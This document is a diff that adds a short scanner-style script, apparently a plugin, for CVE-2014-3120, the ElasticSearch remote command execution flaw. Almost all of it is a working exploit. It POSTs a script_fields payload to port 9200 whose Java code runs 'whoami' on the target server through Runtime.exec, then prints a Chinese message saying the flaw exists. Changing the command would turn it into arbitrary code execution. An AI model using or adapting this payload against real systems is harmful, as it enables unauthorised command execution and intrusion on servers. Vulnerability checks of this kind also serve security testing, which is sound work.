@@ -1,0 +1,15 @@
+#request url = var
+#define payload = :9200/_search?pretty
+#define bug =  200 OK
+#define info = 存在CVE-2014-3120 ElasticSearch远程命令执行
+#define post ={"size": 1, "query": {"filtered": {"query": {"match_all": {}}}}, "script_fields": {"command": {"script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}
+
+
+function main(args)
+{
+	res = HttpPost(url.payload,post,"Content-Type: application/x-www-form-urlencoded".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[1],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
